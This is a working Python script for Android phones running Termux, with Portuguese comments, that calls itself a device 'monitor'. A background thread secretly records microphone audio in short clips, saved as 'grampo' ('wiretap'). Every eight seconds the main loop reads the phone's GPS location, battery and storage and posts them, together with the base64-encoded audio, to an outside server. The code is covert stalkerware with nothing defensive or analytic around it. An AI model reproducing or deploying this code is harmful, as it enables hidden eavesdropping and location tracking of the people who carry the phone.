import time
import subprocess
import json
import requests
import os
import base64
import threading

URL_SERVIDOR = "https://nexos-t0to.onrender.com/update"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_AUDIO = os.path.expanduser("~/grampo.wav")

audio_global_b64 = ""

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(os.getpid())[:4].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_id_unico()

print("\n" + "="*45)
print(f"🤖  SISTEMA MULTI-THREAD NEXOS ATIVADO!")
print(f"🔑  SEU MONITOR ID CONTINUA: {DEVICE_ID}")
print("="*45 + "\n")

# THREAD PARALELA: Fica gravando e quebrando o áudio de fundo de forma invisível
def loop_gravacao_audio():
    global audio_global_b64
    while True:
        try:
            run_command("termux-microphone-record -q")
            if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
            
            # Grava no formato nativo .wav reconhecido instantaneamente por navegadores
            subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
            time.sleep(5)
            run_command("termux-microphone-record -q")
            
            if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 500:
                with open(ARQUIVO_AUDIO, "rb") as f:
                    audio_global_b64 = base64.b64encode(f.read()).decode('utf-8')
        except:
            pass
        time.sleep(1)

# Ativa a thread do microfone antes de começar o envio principal
threading.Thread(target=loop_gravacao_audio, daemon=True).start()

def enviar_dados_principais():
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    lat, lon = -16.6869, -49.2648
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            lat = loc_data.get("latitude", lat)
            lon = loc_data.get("longitude", lon)
        except: pass

    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon,
        "audio_b64": audio_global_b64  # Puxa o último áudio coletado pela outra thread
    }

    try:
        response = requests.post(URL_SERVIDOR, json=payload, timeout=8)
        if response.status_code == 200: 
            print(f"📡 [PRINCIPAL] Localização enviada! GPS: {lat}, {lon}")
    except Exception as e:
        print(f"❌ Falha de comunicação: {e}")

# LOOP PRINCIPAL: Roda liso e livre a cada 8 segundos sem travar com sleep longo
while True:
    enviar_dados_principais()
    time.sleep(8)
